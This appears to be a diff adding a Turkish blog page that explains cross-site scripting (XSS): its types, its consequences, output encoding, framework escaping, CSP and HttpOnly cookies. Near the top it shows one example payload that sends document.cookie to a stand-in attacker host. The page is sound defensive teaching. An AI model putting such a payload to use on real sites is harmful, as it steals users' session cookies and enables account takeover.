@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' https://www.googletagmanager.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://cdnjs.cloudflare.com; font-src 'self' https://fonts.gstatic.com https://cdnjs.cloudflare.com; img-src 'self' data: https://www.googletagmanager.com https://*.google-analytics.com https://*.googletagmanager.com; connect-src 'self' https://api.web3forms.com https://*.google-analytics.com https://*.analytics.google.com https://www.googletagmanager.com; form-action 'self' https://api.web3forms.com; frame-src 'none'; worker-src 'self'; manifest-src 'self'; media-src 'self'; base-uri 'self'; object-src 'none'; upgrade-insecure-requests">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+<title>XSS (Cross-Site Scripting) Nedir? Web Uygulamalarında Nasıl Önlenir? | Furkan Kapukaya</title>
+<meta name="description" content="Siteler arası betik çalıştırma (XSS) saldırısının türleri, oturum çalma gibi sonuçları, çıktı kodlama, Razor ve modern çatıların koruması, Content Security Policy, HttpOnly çerezler ve zengin metin güvenliği.">
+<meta name="author" content="Furkan Kapukaya">
+<meta name="robots" content="index, follow, max-image-preview:large, max-snippet:-1">
+<meta name="theme-color" content="#121212">
+<meta name="color-scheme" content="dark">
+<meta name="format-detection" content="telephone=no">
+<script src="../assets/js/boot-head.js?v=20261009"></script>
+<link rel="canonical" href="https://kapukaya.dev/blog/xss-nedir.html">
+<link rel="alternate" hreflang="tr" href="https://kapukaya.dev/blog/xss-nedir.html">
+<link rel="alternate" hreflang="x-default" href="https://kapukaya.dev/blog/xss-nedir.html">
+<meta property="og:type" content="article">
+<meta property="og:locale" content="tr_TR">
+<meta property="og:site_name" content="Furkan Kapukaya">
+<meta property="og:title" content="XSS (Cross-Site Scripting) Nedir? Web Uygulamalarında Nasıl Önlenir? | Furkan Kapukaya">
+<meta property="og:description" content="Siteler arası betik çalıştırma (XSS) saldırısının türleri, oturum çalma gibi sonuçları, çıktı kodlama, Razor ve modern çatıların koruması, Content Security Policy, HttpOnly çerezler ve zengin metin güvenliği.">
+<meta property="og:url" content="https://kapukaya.dev/blog/xss-nedir.html">
+<meta property="og:image" content="https://kapukaya.dev/assets/images/blog/og/xss-nedir.jpg">
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="630">
+<meta property="og:image:alt" content="XSS (Cross-Site Scripting) Nedir? Web Uygulamalarında Nasıl Önlenir?">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:creator" content="@furkankapukayaa">
+<meta name="twitter:title" content="XSS (Cross-Site Scripting) Nedir? Web Uygulamalarında Nasıl Önlenir? | Furkan Kapukaya">
+<meta name="twitter:description" content="Siteler arası betik çalıştırma (XSS) saldırısının türleri, oturum çalma gibi sonuçları, çıktı kodlama, Razor ve modern çatıların koruması, Content Security Policy, HttpOnly çerezler ve zengin metin güvenliği.">
+<meta name="twitter:image" content="https://kapukaya.dev/assets/images/blog/og/xss-nedir.jpg">
+<meta property="article:published_time" content="2026-10-05">
+<meta property="article:modified_time" content="2026-10-05">
+<meta property="article:section" content="Güvenlik ve KVKK">
+<link rel="icon" href="../assets/images/favicon.ico" sizes="32x32">
+<link rel="icon" type="image/png" href="../assets/images/icons/icon-192.png" sizes="192x192">
+<link rel="apple-touch-icon" href="../assets/images/icons/apple-touch-icon.png">
+<link rel="manifest" href="../site.webmanifest">
+<link rel="alternate" type="text/plain" title="LLM özeti" href="../llms.txt">
+<link rel="alternate" type="application/rss+xml" title="Furkan Kapukaya Blog" href="../feed.xml">
+<link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css" crossorigin="anonymous" referrerpolicy="no-referrer">
+<link rel="stylesheet" href="../assets/css/chrome.css?v=20261009">
+<link rel="stylesheet" href="../assets/css/site.css?v=20261010">
+<script type="application/ld+json">{"@context": "https://schema.org", "@type": "BlogPosting", "headline": "XSS (Cross-Site Scripting) Nedir? Web Uygulamalarında Nasıl Önlenir?", "description": "Siteler arası betik çalıştırma (XSS) saldırısının türleri, oturum çalma gibi sonuçları, çıktı kodlama, Razor ve modern çatıların koruması, Content Security Policy, HttpOnly çerezler ve zengin metin güvenliği.", "url": "https://kapukaya.dev/blog/xss-nedir.html", "mainEntityOfPage": "https://kapukaya.dev/blog/xss-nedir.html", "datePublished": "2026-10-05", "dateModified": "2026-10-05", "inLanguage": "tr", "articleSection": "Güvenlik ve KVKK", "wordCount": 438, "timeRequired": "PT3M", "image": "https://kapukaya.dev/assets/images/blog/og/xss-nedir.jpg", "author": {"@type": "Person", "name": "Furkan Kapukaya", "url": "https://kapukaya.dev/hakkimda.html"}, "publisher": {"@type": "Person", "name": "Furkan Kapukaya", "url": "https://kapukaya.dev/"}, "keywords": "xss nedir, cross site scripting, xss önleme, stored xss, content security policy, html encode"}</script>
+<script type="application/ld+json">{"@context": "https://schema.org", "@type": "BreadcrumbList", "itemListElement": [{"@type": "ListItem", "position": 1, "name": "Ana sayfa", "item": "https://kapukaya.dev/"}, {"@type": "ListItem", "position": 2, "name": "Blog", "item": "https://kapukaya.dev/blog/"}, {"@type": "ListItem", "position": 3, "name": "Güvenlik ve KVKK", "item": "https://kapukaya.dev/blog/kategori/guvenlik-kvkk.html"}, {"@type": "ListItem", "position": 4, "name": "XSS (Cross-Site Scripting) Nedir? Web Uygulamalarında Nasıl Önlenir?", "item": "https://kapukaya.dev/blog/xss-nedir.html"}]}</script>
+<script type="application/ld+json">{"@context": "https://schema.org", "@type": "FAQPage", "mainEntity": [{"@type": "Question", "name": "Girdi doğrulama tek başına yeterli mi?", "acceptedAnswer": {"@type": "Answer", "text": "Hayır. Aynı veri farklı bağlamlarda farklı tehlike taşır. Asıl savunma, veriyi yazdığınız noktada doğru kodlamaktır."}}, {"@type": "Question", "name": "XSS ile SQL injection arasındaki fark nedir?", "acceptedAnswer": {"@type": "Answer", "text": "SQL injection sunucudaki veritabanını hedef alır; XSS ise diğer kullanıcıların tarayıcısını. Bkz. SQL injection önleme."}}]}</script>
+<script src="../assets/js/analytics.js" defer></script>
+</head>
+<body>
+<div class="boot" id="boot" aria-hidden="true"></div>
+<script src="../assets/js/boot.js?v=20261009"></script>
+<a class="skip-link" href="#icerik">İçeriğe geç</a>
+<header class="k-header">
+  <div class="k-header__inner">
+    <a class="k-brand" href="../index.html" aria-label="Furkan Kapukaya, ana sayfa">
+      <span class="k-brand__mark" aria-hidden="true">FK</span>
+      <span><span class="k-brand__name">Furkan Kapukaya</span><span class="k-brand__role">Yazılım geliştirme</span></span>
+    </a>
+    <button class="k-menu-btn" type="button" aria-expanded="false" aria-controls="k-nav" aria-label="Menüyü aç"><i class="fa-solid fa-bars" aria-hidden="true"></i></button>
+    <nav class="k-nav" id="k-nav" aria-label="Ana menü"><a href="../index.html#hizmetler">Hizmetler</a><a href="../index.html#isler">İşler</a><a href="../index.html#surec">Süreç</a><a href="../hakkimda.html">Hakkımda</a><a href="../blog/index.html" aria-current="page">Blog</a><a class="k-nav__cta" href="../index.html#iletisim">Teklif isteyin</a></nav>
+  </div>
+</header>
+<main id="icerik">
+
+<section class="page-hero article-hero article-hero--guvenlik">
+  <div class="wrap">
+    <nav class="crumbs" aria-label="Konum"><a href="../index.html">Ana sayfa</a> / <a href="../blog/index.html">Blog</a> / <a href="../blog/kategori/guvenlik-kvkk.html">Güvenlik ve KVKK</a></nav>
+    <div class="art-meta"><a class="art-cat" href="../blog/kategori/guvenlik-kvkk.html">Güvenlik ve KVKK</a><time datetime="2026-10-05">5 Ekim 2026</time><span>3 dk okuma</span><button type="button" class="art-save" data-save hidden><i class="fa-regular fa-bookmark" aria-hidden="true"></i><span>Kaydet</span></button></div>
+    <h1>XSS (Cross-Site Scripting) Nedir? Web Uygulamalarında Nasıl Önlenir?</h1>
+    <p class="page-hero__lead">Siteler arası betik çalıştırma (XSS) saldırısının türleri, oturum çalma gibi sonuçları, çıktı kodlama, Razor ve modern çatıların koruması, Content Security Policy, HttpOnly çerezler ve zengin metin güvenliği.</p>
+  </div>
+</section>
+<div class="wrap article-layout">
+  <article class="prose">
+<p>XSS (Cross-Site Scripting), saldırganın bir web sitesine kendi JavaScript kodunu yerleştirip diğer kullanıcıların tarayıcısında çalıştırmasıdır. Kod, sitenin kendi kodu gibi çalıştığı için oturum bilgilerine, sayfadaki verilere ve kullanıcının yapabildiği tüm işlemlere erişebilir. Yıllardır en yaygın web açıkları arasında yer almaya devam etmektedir.</p><nav class="toc" aria-label="İçindekiler"><details open><summary>İçindekiler</summary><ol><li><a href="#nasil-olur">Nasıl olur?</a></li><li><a href="#turleri">Türleri</a></li><li><a href="#olasi-sonuclar">Olası sonuçlar</a></li><li><a href="#temel-savunma-cikti-kodlama">Temel savunma: Çıktı kodlama</a></li><li><a href="#baglama-dikkat">Bağlama dikkat</a></li><li><a href="#zengin-metin-html-girdisi">Zengin metin (HTML) girdisi</a></li><li><a href="#ek-savunma-katmanlari">Ek savunma katmanları</a></li><li><a href="#sik-sorulan-sorular">Sık sorulan sorular</a></li><li><a href="#sonuc">Sonuç</a></li></ol></details></nav>
+<h2 id="nasil-olur">Nasıl olur?</h2>
+<p>Bir yorum alanına şu metin yazılır ve site bunu olduğu gibi sayfaya basarsa:</p>
+<pre><code class="language-html">&lt;script&gt;fetch('https://saldirgan.example/?c=' + document.cookie)&lt;/script&gt;</code></pre>
+<p>Yorumu görüntüleyen her kullanıcının tarayıcısı bu kodu çalıştırır.</p>
+<h2 id="turleri">Türleri</h2>
+<div class="table-wrap"><table>
+<thead><tr><th>Tür</th><th>Nasıl çalışır?</th></tr></thead>
+<tbody>
+<tr><td>Kalıcı (stored)</td><td>Kötü içerik veritabanına kaydedilir, sayfayı açan herkese çalışır</td></tr>
+<tr><td>Yansıtılan (reflected)</td><td>Kötü içerik bağlantıda gelir; kurban hazırlanmış bir bağlantıya tıklar</td></tr>
+<tr><td>DOM tabanlı</td><td>Sunucu karışmaz; sayfadaki JavaScript, URL veya girdiden aldığı veriyi güvensiz şekilde sayfaya yazar</td></tr>
+</tbody></table></div>
+<h2 id="olasi-sonuclar">Olası sonuçlar</h2>
+<ul>
+<li>Oturum çerezlerinin çalınması ve hesap ele geçirme</li>
+<li>Kullanıcı adına işlem yapılması (sipariş, şifre değişikliği)</li>
+<li>Sahte giriş formlarıyla parola toplanması</li>
+<li>Sayfa içeriğinin değiştirilmesi</li>
+</ul>
+<h2 id="temel-savunma-cikti-kodlama">Temel savunma: Çıktı kodlama</h2>
+<p>Kullanıcıdan gelen veri sayfaya yazılırken <strong>bağlama uygun şekilde kodlanmalıdır</strong>: HTML içinde <code>&lt;</code> karakteri <code>&amp;lt;</code> olur ve kod olarak değil metin olarak görünür.</p>
+<p>İyi haber: Razor (ASP.NET Core), Blazor, React, Vue ve Angular gibi modern araçlar varsayılan olarak kodlama yapar. Sorun, bu korumayı <strong>bilerek atlayan</strong> yerlerde ortaya çıkar:</p>
+<ul>
+<li>Razor'da <code>@Html.Raw(...)</code></li>
+<li>React'te <code>dangerouslySetInnerHTML</code></li>
+<li>JavaScript'te <code>element.innerHTML = kullaniciVerisi</code></li>
+</ul>
+<p>Bu kullanımlar kod incelemesinde özel dikkat gerektirir. Bkz. <a href="code-review-rehberi.html">code review</a>.</p>
+<h2 id="baglama-dikkat">Bağlama dikkat</h2>
+<p>HTML gövdesi, HTML öznitelikleri, JavaScript içi, URL ve CSS için kodlama kuralları farklıdır. Örneğin kullanıcı verisini <code>href</code> özniteliğine yazarken <code>javascript:</code> ile başlayan adresler engellenmelidir. Veriyi doğrudan script blokları içine yazmaktan kaçının; bunun yerine <code>data-</code> öznitelikleri veya JSON kullanın.</p>
+<h2 id="zengin-metin-html-girdisi">Zengin metin (HTML) girdisi</h2>
+<p>Blog editörü veya ürün açıklaması gibi alanlarda kullanıcının HTML girmesi gerekiyorsa, <strong>izin listesi tabanlı bir HTML temizleyici</strong> kullanılmalıdır. Yasaklı etiketleri tek tek aramaya çalışan kara liste yaklaşımları aşılabilir.</p>
+<h2 id="ek-savunma-katmanlari">Ek savunma katmanları</h2>
+<ol>
+<li><strong>Content Security Policy (CSP):</strong> Yalnızca izin verilen kaynaklardan script çalıştırılmasını sağlar; satır içi script'leri engelleyerek XSS'in etkisini büyük ölçüde azaltır. Bkz. <a href="http-guvenlik-basliklari" target="_blank" rel="noopener">HTTP güvenlik başlıkları</a>.</li>
+<li><strong>HttpOnly çerezler:</strong> Oturum çerezleri JavaScript ile okunamaz; çerez çalma engellenir.</li>
+<li><strong>Girdi doğrulama:</strong> Beklenen formatı dayatmak (sayı, tarih, e-posta) saldırı yüzeyini daraltır; ama çıktı kodlamanın yerini tutmaz.</li>
+</ol>
+<h2 id="sik-sorulan-sorular">Sık sorulan sorular</h2>
+<h3>Girdi doğrulama tek başına yeterli mi?</h3>
+<p>Hayır. Aynı veri farklı bağlamlarda farklı tehlike taşır. Asıl savunma, veriyi yazdığınız noktada doğru kodlamaktır.</p>
+<h3>XSS ile SQL injection arasındaki fark nedir?</h3>
+<p>SQL injection sunucudaki veritabanını hedef alır; XSS ise diğer kullanıcıların tarayıcısını. Bkz. <a href="sql-injection-onleme.html">SQL injection önleme</a>.</p>
+<h2 id="sonuc">Sonuç</h2>
+<p>XSS'e karşı en güçlü koruma, modern araçların varsayılan kodlamasını bozmamak ve CSP gibi ek katmanlar eklemektir. Ham HTML basan her satır, potansiyel bir açık olarak ele alınmalıdır.</p><aside class="path-box" data-path="guvenli-web-uygulamasi" data-steps="owasp-top-10-web-guvenligi sql-injection-onleme xss-nedir csrf-nedir parola-saklama-hash http-guvenlik-basliklari" aria-label="Okuma yolu"><p class="path-box__k"><i class="fa-solid fa-route" aria-hidden="true"></i>Okuma yolu, adım 3 / 6</p><b><a href="yollar.html#guvenli-web-uygulamasi">Güvenli web uygulaması</a></b><div class="path-box__bar" aria-hidden="true"><i data-path-fill></i></div><small data-path-txt></small><a class="path-box__next" href="csrf-nedir.html">Sonraki adım: CSRF Nedir? Siteler Arası İstek Sahteciliğine Karşı Korunma <i class="fa-solid fa-arrow-right" aria-hidden="true"></i></a></aside><aside class="ai-note" role="note"><i class="fa-solid fa-robot" aria-hidden="true"></i><p><strong>Dipnot:</strong> Bu yazı yapay zekâ tarafından yazılmıştır. İçerik genel bilgilendirme amaçlıdır, yayımlandığı tarihteki bilgilere dayanır; kendi projenizde uygulamadan önce güncel resmî kaynaklarla ve gerektiğinde bir uzmanla doğrulayınız.</p></aside>
+  </article>
+  <aside class="article-aside">
+    <div class="aside-card">
+      <div class="aside-author"><img decoding="async" src="../assets/images/my-avatar.webp" alt="" width="48" height="48"><span><b>Furkan Kapukaya</b><small>Yazılım geliştirici</small></span></div>
+      <p>C# ve .NET ile işletmelere özel masaüstü, web ve konsol uygulamaları geliştiren yazılım geliştirici.</p>
+      <a class="link-more" href="../hakkimda.html">Hakkımda <i class="fa-solid fa-arrow-right" aria-hidden="true"></i></a>
+    </div>
+    <div class="aside-card aside-card--cta">
+      <b>Bir projeniz mi var?</b>
+      <p>İhtiyacınızı paylaşın; size özel bir teklif hazırlansın.</p>
+      <a class="btn btn--primary" href="../index.html#iletisim">Teklif isteyin</a>
+    </div>
+    <div class="aside-card">
+      <b class="aside-title">Kategoriler</b>
+      <ul class="aside-cats"><li><a href="../blog/kategori/dijital-temeller.html">Dijital Temeller</a></li><li><a href="../blog/kategori/web-tasarim-gelistirme.html">Web Tasarım ve Geliştirme</a></li><li><a href="../blog/kategori/seo-dijital-pazarlama.html">SEO ve Dijital Pazarlama</a></li><li><a href="../blog/kategori/isletme-yazilimlari.html">İşletme Yazılımları</a></li><li><a href="../blog/kategori/e-ticaret-odeme.html">E-ticaret ve Ödeme</a></li><li><a href="../blog/kategori/otomasyon-entegrasyon.html">Otomasyon ve Entegrasyon</a></li><li><a href="../blog/kategori/veri-raporlama.html">Veri ve Raporlama</a></li><li><a href="../blog/kategori/csharp-dotnet.html">C# ve .NET</a></li><li><a href="../blog/kategori/backend-api-veritabani.html">Backend, API ve Veritabanı</a></li><li><a href="../blog/kategori/yazilim-mimarisi-temiz-kod.html">Yazılım Mimarisi ve Temiz Kod</a></li><li><a href="../blog/kategori/sunucu-bulut-devops.html">Sunucu, Bulut ve DevOps</a></li><li><a href="../blog/kategori/guvenlik-kvkk.html" aria-current="page">Güvenlik ve KVKK</a></li><li><a href="../blog/kategori/yapay-zeka.html">Yapay Zekâ</a></li><li><a href="../blog/kategori/proje-sureci-kariyer.html">Proje Süreci ve Kariyer</a></li></ul>
+      <a class="link-more aside-all" href="../blog/kategoriler.html">Tüm kategoriler <i class="fa-solid fa-arrow-right" aria-hidden="true"></i></a>
+    </div>
+  </aside>
+</div>
+<section class="section">
+  <div class="wrap">
+    <div class="section__head"><h2>İlgili yazılar</h2></div>
+    <ul class="posts"><li class="post" data-cat="guvenlik" data-search="http guvenlik basliklari csp hsts ve digerleri web sitelerini xss tiklama korsanligi ve protokol dusurme saldirilarina karsi koruyan content-security-policy hsts x-content-type-options referrer-policy ve permissions-policy basliklarinin kullanimi. guvenlik ve kvkk http guvenlik basliklari content security policy hsts clickjacking web guvenligi"><a href="../blog/http-guvenlik-basliklari.html"><span class="post__cover post__cover--guvenlik"><img src="../assets/images/blog/thumb/http-guvenlik-basliklari.webp" alt="" width="600" height="315" loading="lazy" decoding="async"></span><span class="post__meta"><span>Güvenlik ve KVKK</span><span>2 dk</span></span><h3>HTTP Güvenlik Başlıkları: CSP, HSTS ve Diğerleri</h3><p>Web sitelerini XSS, tıklama korsanlığı ve protokol düşürme saldırılarına karşı koruyan Content-Security-Policy, HSTS, X-Content-Type-Options, Referrer-Policy ve Permissions-Policy başlıklarının kullanımı.</p><span class="post__more">Yazıyı oku</span></a></li><li class="post" data-cat="guvenlik" data-search="sql injection nasil onlenir guvenli veritabani erisimi sql injection aciginin nedeni parametreli sorgular orm kullanimi en az yetki ilkesi girdi dogrulama ve .net uygulamalarinda guvenli veritabani erisimi icin pratik oneriler. guvenlik ve kvkk sql injection sql enjeksiyonu onleme parametreli sorgu guvenli kodlama .net veritabani guvenligi"><a href="../blog/sql-injection-onleme.html"><span class="post__cover post__cover--guvenlik"><img src="../assets/images/blog/thumb/sql-injection-onleme.webp" alt="" width="600" height="315" loading="lazy" decoding="async"></span><span class="post__meta"><span>Güvenlik ve KVKK</span><span>2 dk</span></span><h3>SQL Injection Nasıl Önlenir? Güvenli Veritabanı Erişimi</h3><p>SQL injection açığının nedeni, parametreli sorgular, ORM kullanımı, en az yetki ilkesi, girdi doğrulama ve .NET uygulamalarında güvenli veritabanı erişimi için pratik öneriler.</p><span class="post__more">Yazıyı oku</span></a></li><li class="post" data-cat="guvenlik" data-search="csrf nedir siteler arasi istek sahteciligine karsi korunma cross-site request forgery csrf saldirisinin calisma mantigi ornek senaryo anti-forgery token samesite cerezler asp.net core korumasi api lerde durum ve sik yapilan hatalar. guvenlik ve kvkk csrf nedir cross site request forgery anti forgery token samesite cookie csrf korumasi asp.net core antiforgery"><a href="../blog/csrf-nedir.html"><span class="post__cover post__cover--guvenlik"><img src="../assets/images/blog/thumb/csrf-nedir.webp" alt="" width="600" height="315" loading="lazy" decoding="async"></span><span class="post__meta"><span>Güvenlik ve KVKK</span><span>3 dk</span></span><h3>CSRF Nedir? Siteler Arası İstek Sahteciliğine Karşı Korunma</h3><p>Cross-Site Request Forgery (CSRF) saldırısının çalışma mantığı, örnek senaryo, anti-forgery token, SameSite çerezler, ASP.NET Core koruması, API&#x27;lerde durum ve sık yapılan hatalar.</p><span class="post__more">Yazıyı oku</span></a></li></ul>
+    <div class="section__foot"><a class="link-more" href="../blog/kategori/guvenlik-kvkk.html">Güvenlik ve KVKK kategorisindeki tüm yazılar <i class="fa-solid fa-arrow-right" aria-hidden="true"></i></a></div>
+  </div>
+</section>
+
+</main>
+<footer class="k-footer">
+  <div class="k-footer__inner">
+    <div>
+      <a class="k-brand" href="../index.html"><span class="k-brand__mark" aria-hidden="true">FK</span><span><span class="k-brand__name">Furkan Kapukaya</span><span class="k-brand__role">Yazılım geliştirme</span></span></a>
+      <p class="k-footer__slogan">Fikirden, her gün kullanılan yazılıma.</p>
+      <p>Masaüstü, web ve konsol uygulamalarıyla işletmelerin günlük süreçlerini kolaylaştıran, sade ve güvenilir yazılım çözümleri.</p>
+      <div class="k-footer__social"><a href="https://www.linkedin.com/in/furkankapukayaa" target="_blank" rel="me noopener" aria-label="LinkedIn"><i class="fa-brands fa-linkedin-in" aria-hidden="true"></i></a><a href="https://github.com/furkankapukayaa" target="_blank" rel="me noopener" aria-label="GitHub"><i class="fa-brands fa-github" aria-hidden="true"></i></a><a href="https://www.instagram.com/furkankapukayaa" target="_blank" rel="me noopener" aria-label="Instagram"><i class="fa-brands fa-instagram" aria-hidden="true"></i></a><a href="https://twitter.com/furkankapukayaa" target="_blank" rel="me noopener" aria-label="X"><i class="fa-brands fa-x-twitter" aria-hidden="true"></i></a><a href="https://www.youtube.com/channel/UCwBs0J59FuWuStJIcgFgm5Q" target="_blank" rel="me noopener" aria-label="YouTube"><i class="fa-brands fa-youtube" aria-hidden="true"></i></a></div>
+    </div>
+    <div>
+      <h2>Site</h2>
+      <ul>
+        <li><a href="../index.html#hizmetler">Hizmetler</a></li>
+        <li><a href="../index.html#isler">İşler</a></li>
+        <li><a href="../hakkimda.html">Hakkımda</a></li>
+        <li><a href="../blog/index.html">Blog</a></li>
+      </ul>
+    </div>
+    <div>
+      <h2>İletişim</h2>
+      <ul>
+        <li><a href="mailto:info@kapukaya.dev">info@kapukaya.dev</a></li>
+        <li><a href="../index.html#iletisim">Teklif formu</a></li>
+        <li>İstanbul, Türkiye</li>
+      </ul>
+    </div>
+  </div>
+  <div class="k-footer__bottom">
+    <span>© <span data-year>2026</span> Furkan Kapukaya</span>
+    <nav class="k-footer__legal" aria-label="Yasal bilgiler"><a href="../privacy.html">Gizlilik</a><a href="../kvkk-aydinlatma-metni.html">KVKK aydınlatma</a><a href="../cerez-politikasi.html">Çerez politikası</a><button type="button" data-consent-open>Çerez tercihleri</button><a href="../guvenlik.html">Güvenlik</a></nav>
+  </div>
+</footer>
+<script src="../assets/js/site.js?v=20261009" defer></script>
+<script src="../assets/js/blog.js?v=20261010" defer></script>
+<script src="../assets/js/extras.js?v=20261009" defer></script>
+</body>
+</html>
